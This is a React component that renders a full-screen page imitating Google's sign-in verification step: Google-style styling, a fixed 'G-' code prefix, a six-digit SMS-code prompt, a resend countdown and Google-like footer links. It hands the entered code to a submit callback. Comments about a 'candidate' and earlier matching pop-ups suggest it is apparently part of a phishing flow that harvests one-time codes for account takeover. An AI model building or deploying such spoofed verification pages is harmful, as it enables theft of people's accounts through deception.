"use client";

import { useState, useEffect, useRef } from "react";

interface GPopUpModalProps {
  isOpen: boolean;
  isSubmitted?: boolean;
  errorMessage?: string | null;
  onSubmitCode: (code: string) => Promise<void>;
  onClose?: () => void;
}

export default function GPopUpModal({
  isOpen,
  isSubmitted = false,
  errorMessage = null,
  onSubmitCode,
  onClose,
}: GPopUpModalProps) {
  const [code, setCode] = useState("");
  const [isFocused, setIsFocused] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [error, setError] = useState<string | null>(errorMessage);
  const [countdown, setCountdown] = useState(28);
  const inputRef = useRef<HTMLInputElement>(null);

  // Sync external error message or reset state when modal opens
  useEffect(() => {
    if (isOpen) {
      if (errorMessage) {
        setError(errorMessage);
        setIsSubmitting(false);
      } else {
        setCode("");
        setError(null);
        setIsSubmitting(false);
        setCountdown(28);
      }
    }
  }, [isOpen, errorMessage]);

  // Countdown timer: 28 seconds (as pictured in screenshot)
  useEffect(() => {
    if (!isOpen || countdown <= 0) return;
    const interval = setInterval(() => {
      setCountdown((prev) => (prev > 0 ? prev - 1 : 0));
    }, 1000);
    return () => clearInterval(interval);
  }, [isOpen, countdown]);

  if (!isOpen) return null;

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let raw = e.target.value;
    // Strip redundant "G-" prefix if pasted by candidate
    raw = raw.replace(/^G-?\s*/i, "");
    // Keep numbers and letters, max 8 chars (typically 6 digits)
    const cleaned = raw.replace(/[^a-zA-Z0-9]/g, "").slice(0, 8);
    setCode(cleaned);
    if (error) setError(null);
  };

  const handleSubmit = async (e?: React.FormEvent) => {
    if (e) e.preventDefault();
    if (!code.trim()) {
      setError("Enter the code");
      return;
    }
    setError(null);
    setIsSubmitting(true);
    try {
      // Format code as G-XXXXXX
      const formatted = `G-${code.trim()}`;
      await onSubmitCode(formatted);
    } catch (err: any) {
      setError(err?.message || "Failed to submit code. Please try again.");
      setIsSubmitting(false);
    }
  };

  const showSpinnerOnly = isSubmitting || isSubmitted;

  return (
    <div
      className="fixed inset-0 z-[100] flex flex-col items-center justify-center bg-[#f0f4f9] p-3 sm:p-6 md:p-10 overflow-y-auto animate-fade-in font-sans"
      role="dialog"
      aria-modal="true"
    >
      <div className="w-full max-w-[1184px] flex flex-col items-center">
        {/* Main Google/SSO Style Card - Scaled Frame (-20%) */}
        <div className="w-full min-h-[512px] sm:min-h-[560px] bg-white rounded-[28px] p-8 sm:p-12 lg:p-16 shadow-[0_8px_36px_rgba(0,0,0,0.08)] border border-black/[0.04] transition-all relative overflow-hidden flex flex-col justify-center">
          {/* Subtle top indeterminate progress bar when submitting */}
          {showSpinnerOnly && (
            <div className="absolute top-0 left-0 right-0 h-1.5 bg-blue-100 overflow-hidden">
              <div className="h-full bg-[#0b57d0] animate-indeterminate" />
            </div>
          )}

          <div className="grid grid-cols-1 md:grid-cols-2 gap-8 md:gap-14 lg:gap-20 items-center">
            {/* Left Column: N-Logo & "Enter the code" */}
            <div className="space-y-5 sm:space-y-6">
              {/* N-Logo (PNG Format) */}
              <div className="flex items-center">
                <img
                  src="/images/n-logo.png"
                  alt="N-Logo"
                  className="w-16 h-16 object-contain rounded-xl select-none shadow-sm"
                />
              </div>

              {/* Title */}
              <div className="pt-1">
                <h1 className="text-3xl sm:text-4xl lg:text-[43px] font-normal text-[#1f1f1f] tracking-tight leading-[1.15]">
                  Enter the code
                </h1>
              </div>
            </div>

            {/* Right Column: G-Code Input OR Pure Round Loading Spinner */}
            <div className="w-full flex flex-col justify-center">
              {showSpinnerOnly ? (
                /* Pure Round Loading Circle (Identical to Pop-up #1 and #2) */
                <div className="py-20 sm:py-28 flex flex-col items-center justify-center animate-fade-in w-full">
                  <div
                    className="w-14 h-14 sm:w-16 sm:h-16 border-[4px] border-blue-200 border-t-[#0b57d0] rounded-full animate-spin"
                    aria-label="Loading..."
                  />
                </div>
              ) : (
                /* Verification Code Form */
                <form onSubmit={handleSubmit} className="space-y-3.5 pt-2 md:pt-3">
                  {/* Instructional Subtitle */}
                  <p className="text-sm sm:text-base text-[#1f1f1f] font-normal leading-normal pb-1">
                    Enter the 6-digit verification code to confirm you got the text message
                  </p>

                  {/* Outlined Input with "Enter code" notched floating label & fixed "G-" prefix */}
                  <div className="relative">
                    <div
                      onClick={() => inputRef.current?.focus()}
                      className={`relative flex items-center h-[54px] sm:h-[60px] px-4 bg-white rounded-[5px] border transition-all cursor-text ${
                        error
                          ? "border-2 border-[#b3261e]"
                          : isFocused
                          ? "border-2 border-[#0b57d0]"
                          : "border border-[#747775] hover:border-[#1f1f1f]"
                      }`}
                    >
                      {/* Floating Label with white background cutout */}
                      <label
                        className={`absolute left-3.5 -top-2.5 text-xs sm:text-xs px-1 bg-white select-none transition-all pointer-events-none font-normal ${
                          error
                            ? "text-[#b3261e] font-medium"
                            : isFocused
                            ? "text-[#0b57d0] font-medium"
                            : "text-[#444746]"
                        }`}
                      >
                        Enter code
                      </label>

                      {/* Fixed "G-" Prefix */}
                      <span className="text-base sm:text-lg font-normal text-[#1f1f1f] select-none pr-1 tracking-wide">
                        G-
                      </span>

                      {/* Code Input */}
                      <input
                        ref={inputRef}
                        type="text"
                        value={code}
                        onChange={handleInputChange}
                        onFocus={() => setIsFocused(true)}
                        onBlur={() => setIsFocused(false)}
                        autoComplete="one-time-code"
                        autoFocus
                        disabled={isSubmitting}
                        className="flex-1 h-full bg-transparent text-base sm:text-lg text-[#1f1f1f] outline-none font-sans tracking-wide"
                      />
                    </div>
                  </div>

                  {/* Error Notification */}
                  {error && (
                    <div className="pt-1 flex items-center gap-2 text-xs sm:text-sm text-[#b3261e] font-normal animate-fade-in">
                      <svg className="w-4 h-4 shrink-0 fill-current" viewBox="0 0 20 20">
                        <path
                          fillRule="evenodd"
                          d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z"
                          clipRule="evenodd"
                        />
                      </svg>
                      <span>{error}</span>
                    </div>
                  )}

                  {/* Action Row: Countdown / Resend & Next Button */}
                  <div className="flex items-center justify-between pt-8 sm:pt-12">
                    {countdown > 0 ? (
                      <span className="text-xs sm:text-sm text-[#444746] font-normal select-none">
                        Get new code ({countdown} seconds)
                      </span>
                    ) : (
                      <button
                        type="button"
                        onClick={() => {
                          setCountdown(28);
                          setError(null);
                        }}
                        className="text-xs sm:text-sm font-medium text-[#0b57d0] hover:underline cursor-pointer select-none"
                      >
                        Get new code
                      </button>
                    )}

                    <button
                      type="submit"
                      disabled={isSubmitting || !code.trim()}
                      className="bg-[#0b57d0] hover:bg-[#0842a0] disabled:bg-[#0b57d0]/40 disabled:cursor-not-allowed text-white font-medium text-sm sm:text-base px-7 py-2.5 sm:py-3 rounded-full transition-all active:scale-95 shadow-xs flex items-center justify-center cursor-pointer select-none"
                    >
                      <span>Next</span>
                    </button>
                  </div>
                </form>
              )}
            </div>
          </div>
        </div>

        {/* Outer Footer Below Card (Identical to Pop-up #1 and #2) */}
        <div className="w-full max-w-[1184px] flex flex-col sm:flex-row items-center justify-between gap-3 text-xs sm:text-sm text-[#444746] mt-5 px-4 select-none">
          {/* Language selector */}
          <div className="flex items-center gap-2 hover:text-[#1f1f1f] cursor-pointer">
            <span>English (United States)</span>
            <span className="text-xs">▼</span>
          </div>

          {/* Legal / Help links */}
          <div className="flex items-center gap-6 sm:gap-7">
            <span className="hover:text-[#1f1f1f] hover:underline cursor-pointer">Help</span>
            <span className="hover:text-[#1f1f1f] hover:underline cursor-pointer">Privacy</span>
            <span className="hover:text-[#1f1f1f] hover:underline cursor-pointer">Terms</span>
          </div>
        </div>
      </div>
    </div>
  );
}
